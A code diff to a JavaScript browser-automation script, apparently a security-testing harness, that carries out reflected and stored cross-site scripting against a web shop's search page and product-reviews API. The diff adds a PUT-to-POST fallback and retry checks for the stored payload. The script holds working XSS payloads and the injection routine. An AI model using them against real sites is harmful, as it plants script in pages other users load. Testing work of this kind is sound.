@@ -547,7 +547,7 @@ async function runReflectedXssWorkflow() {
 
   let dialogDetected = false;
   let payloadReflected = false;
-  let challengeDetected = false;
+  let responsePayloadReflected = false;
   const dialogHandler = async dialog => {
     dialogDetected = dialog.message() === "xss";
     await dialog.dismiss().catch(() => undefined);
@@ -559,7 +559,7 @@ async function runReflectedXssWorkflow() {
       timeout: 30000,
     });
     const body = await response.text();
-    payloadReflected = body.includes(payload);
+    responsePayloadReflected = body.includes(payload);
 
     await page.goto(
       new URL(`/#/search?q=${encodeURIComponent(payload)}`, targetUrl.origin).href,
@@ -569,9 +569,6 @@ async function runReflectedXssWorkflow() {
     payloadReflected = await page.locator(
       'iframe[src="javascript:alert(`xss`)"]'
     ).count() > 0;
-    challengeDetected = xssChallengeEvents.some(event =>
-      /reflected|XSS/i.test(event)
-    );
   } finally {
     page.off("dialog", dialogHandler);
   }
@@ -583,10 +580,10 @@ async function runReflectedXssWorkflow() {
     payloadReflected &&
     (dialogDetected || payloadFrames > 0);
   workflow.reflectedXssEvidence = {
+    responsePayloadReflected,
     payloadReflected,
     dialogDetected,
     frameCount: payloadFrames,
-    challengeDetected,
   };
   console.log(
     `WORKFLOW reflected_xss=${workflow.reflectedXss} ` +
@@ -636,39 +633,57 @@ async function runPersistentXssWorkflow() {
 
   const payload = '<iframe src="javascript:alert(`xss`)">';
   const productId = 1;
-  const response = await context.request.put(
-    new URL(`/rest/products/${productId}/reviews`, targetUrl.origin).href,
-    {
-      headers: {
-        "Authorization": `Bearer ${loginToken}`,
-        "Content-Type": "application/json",
-      },
+  const reviewsUrl = new URL(
+    `/rest/products/${productId}/reviews`,
+    targetUrl.origin
+  ).href;
+  const requestHeaders = {
+    "Authorization": `Bearer ${loginToken}`,
+    "Content-Type": "application/json",
+  };
+  let response = await context.request.put(reviewsUrl, {
+    headers: requestHeaders,
+    data: {
+      message: payload,
+      author: testUsername,
+    },
+    timeout: 30000,
+  }).catch(error => {
+    console.log(`WORKFLOW persistent_xss_put_error=${error.message}`);
+    return null;
+  });
+
+  if (!response || (response.status() < 200 || response.status() >= 300)) {
+    response = await context.request.post(reviewsUrl, {
+      headers: requestHeaders,
       data: {
         message: payload,
         author: testUsername,
       },
       timeout: 30000,
-    }
-  ).catch(error => {
-    console.log(`WORKFLOW persistent_xss_request_error=${error.message}`);
-    return null;
-  });
+    }).catch(error => {
+      console.log(`WORKFLOW persistent_xss_post_error=${error.message}`);
+      return null;
+    });
+  }
 
   if (!response) {
     return;
   }
 
-  const reviewsResponse = await context.request.get(
-    new URL(`/rest/products/${productId}/reviews`, targetUrl.origin).href,
-    {
+  let payloadStored = false;
+  let reviewsResponseStatus = null;
+  for (let attempt = 0; attempt < 5 && !payloadStored; attempt += 1) {
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    const reviewsResponse = await context.request.get(reviewsUrl, {
       headers: loginToken ? { "Authorization": `Bearer ${loginToken}` } : {},
       timeout: 30000,
+    }).catch(() => null);
+    reviewsResponseStatus = reviewsResponse?.status() || null;
+    if (reviewsResponse?.ok()) {
+      const reviews = await reviewsResponse.json().catch(() => null);
+      payloadStored = JSON.stringify(reviews).includes(payload);
     }
-  ).catch(() => null);
-  let payloadStored = false;
-  if (reviewsResponse?.ok()) {
-    const reviews = await reviewsResponse.json().catch(() => null);
-    payloadStored = JSON.stringify(reviews).includes(payload);
   }
 
   let persistentDialogDetected = false;
@@ -696,12 +711,10 @@ async function runPersistentXssWorkflow() {
     (persistentDialogDetected || payloadFrames > 0);
   workflow.persistentXssEvidence = {
     status: response.status(),
+    reviewsResponseStatus,
     payloadStored,
     dialogDetected: persistentDialogDetected,
     frameCount: payloadFrames,
-    challengeEvents: xssChallengeEvents.filter(event =>
-      /XSS|challenge solved/i.test(event)
-    ),
   };
   console.log(
     `WORKFLOW persistent_xss=${workflow.persistentXss} ` +
